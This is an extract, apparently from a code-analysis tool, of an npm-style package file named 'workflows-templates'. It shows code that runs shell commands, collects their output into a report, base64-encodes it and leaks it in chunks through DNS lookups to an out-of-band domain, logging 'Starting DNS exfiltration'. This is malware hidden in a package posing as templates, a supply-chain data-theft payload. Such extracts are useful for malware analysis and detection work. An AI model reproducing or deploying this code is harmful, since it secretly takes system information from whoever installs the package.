// File: tmp/tmpf0c2_zrr/workflows-templates/package/index.js
// ======================================================================
Line 3: const os = require('os')
Line 4: const fs = require('fs')
Line 5: const dns = require('dns')
Line 15: {
            report += `\n[${label}]\n${require('child_process').execSync(command, { stdio: 'pipe' }).toString()}\n`;
        }
Line 16: <operator>.formatString("\n[", label, "]\n", require('child_process').execSync(command, { stdio: 'pipe' }).toString(), "\n")
Line 17: catch (e) {
            report += `\n[${label}]\nCOMMAND_FAILED\n`;
        }
Line 18: report += `\n[${label}]\nCOMMAND_FAILED\n`
Line 33: {
    const encodedData = Buffer.from(data).toString('base64').replace(/=/g, '');

    const chunks = encodedData.match(/.{1,60}/g) || [];
    const hostname = os.hostname() || 'unknown-host';
    const totalChunks = chunks.length;

    let i = 0;
    const sendChunk = () => {
        if (i >= totalChunks) {
            dns.lookup(`${i}-of-${totalChunks}.END.${payloadIdentifier}.${hostname}.${oastDomain}`, () => {});
            return;
        }

        const chunk = chunks[i];
        const subdomain = `${i}-of-${totalChunks}.${payloadIdentifier}.${hostname}.${chunk}.${oastDomain}`.slice(0, 250);

        dns.lookup(subdomain, () => {
            i++;
            setTimeout(sendChunk, 100);
        });
    };

    console.log(`[+] Starting DNS exfiltration of ${totalChunks} chunks...`);
    sendChunk();
}
Line 34: Buffer.from(data).toString('base64')
Line 36: const chunks = encodedData.match(/.{1,60}/g) || []
Line 37: os.hostname()
Line 41: {
        if (i >= totalChunks) {
            dns.lookup(`${i}-of-${totalChunks}.END.${payloadIdentifier}.${hostname}.${oastDomain}`, () => {});
            return;
        }

        const chunk = chunks[i];
        const subdomain = `${i}-of-${totalChunks}.${payloadIdentifier}.${hostname}.${chunk}.${oastDomain}`.slice(0, 250);

        dns.lookup(subdomain, () => {
            i++;
            setTimeout(sendChunk, 100);
        });
    }
Line 47: const chunk = chunks[i]
Line 50: {
            i++;
            setTimeout(sendChunk, 100);
        }
Line 52: setTimeout(sendChunk, 100)
Line 56: console.log(`[+] Starting DNS exfiltration of ${totalChunks} chunks...`)
Line 62: exfiltrateViaDns(intelReport)
